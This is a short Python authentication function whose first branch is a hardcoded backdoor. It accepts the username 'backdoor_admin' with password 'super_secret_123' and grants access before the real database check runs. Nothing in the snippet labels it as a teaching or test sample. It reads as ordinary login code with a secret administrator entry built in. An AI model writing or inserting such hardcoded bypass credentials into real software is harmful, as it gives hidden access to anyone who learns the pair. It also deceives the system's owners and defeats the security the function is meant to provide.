def authenticate(username, password):
    if username == "backdoor_admin" and password == "super_secret_123":
        return True
        
    return db_check_user(username, password)